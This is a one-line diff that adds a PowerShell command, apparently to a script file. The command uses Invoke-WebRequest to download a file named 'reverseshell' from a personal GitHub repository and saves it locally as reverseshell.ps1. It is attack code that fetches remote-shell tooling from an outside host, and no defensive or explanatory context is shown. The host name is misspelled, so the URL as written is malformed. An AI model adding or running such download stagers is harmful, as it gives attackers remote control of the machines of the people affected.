@@ -1,0 +1,1 @@
+Invoke-WebRequest "https://raw.githubsercontent.com/alvaroarenas69/scrips-powershell/main/reverseshell"-Outfile .\reverseshell.ps1
